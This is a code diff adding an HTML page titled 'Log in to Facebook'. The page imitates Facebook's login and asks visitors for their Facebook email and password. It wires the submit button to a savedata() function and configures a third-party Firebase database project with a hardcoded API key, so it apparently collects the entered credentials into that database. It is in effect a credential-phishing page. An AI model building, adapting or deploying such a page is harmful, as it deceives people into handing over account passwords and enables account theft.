@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Log in to Facebook</title>
+    <link rel="stylesheet" href="style.css">
+        
+<!-- <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+
+
+<script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-database.js"></script>
+
+<script>
+ 
+  var firebaseConfig = {
+    apiKey: "AIzaSyAI80CXrdNqvdTri9VAUz1TG7DInZkcPLs",
+    authDomain: "jangomissions.firebaseapp.com",
+    databaseURL: "https://jangomissions.firebaseio.com",
+    projectId: "jangomissions",
+    storageBucket: "jangomissions.appspot.com",
+    messagingSenderId: "731098814150",
+    appId: "1:731098814150:web:ac117bc7a2b12d1a8c69c7",
+  };
+ 
+  firebase.initializeApp(firebaseConfig);
+</script> -->
+
+
+    
+<script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-analytics.js"></script>
+
+<script>
+ 
+  var firebaseConfig = {
+    apiKey: "AIzaSyAI80CXrdNqvdTri9VAUz1TG7DInZkcPLs",
+    authDomain: "jangomissions.firebaseapp.com",
+    databaseURL: "https://jangomissions.firebaseio.com",
+    projectId: "jangomissions",
+    storageBucket: "jangomissions.appspot.com",
+    messagingSenderId: "731098814150",
+    appId: "1:731098814150:web:ac117bc7a2b12d1a8c69c7",
+    measurementId: "G-24877JLQ44"
+  };
+ 
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+</script>
+</head>
+
+<body class="gray">
+    <div>
+        <form onsubmit="return myFun()">
+            <div class="margin">
+                <br>
+                <h2 class="img">Login With facbook</h2>
+                <br>
+                <h3 class="span">Enter your facebook email and password</h3>
+                <input type="text" id="mail" placeholder="  Enter Email" value="" >
+                <br>
+                <span id="massage">  </span>
+                <br>
+                <input type="password" id="Password" placeholder="  Enter Password" value="">
+                <br>
+                <span id="massages"> </span>
+                <!-- <br> -->
+                <!-- <input type="password" id="Passwords" placeholder="  Confirm Your Password" value=""> -->
+                <!-- <br> -->
+                <!-- <span id="massagess"> </span> -->
+                <br>
+                <input class="box" type="checkbox" name="" id="">
+                <p class="para">
+                    <a href="policy.html">Privacy Policy</a>
+                </p>
+                <input class="btn" onclick="savedata()" type="submit" value="Login">
+            </div>
+        </form>
+    </div>
+    <script src="app.js"></script>
+    
+</body>
+
+</html>
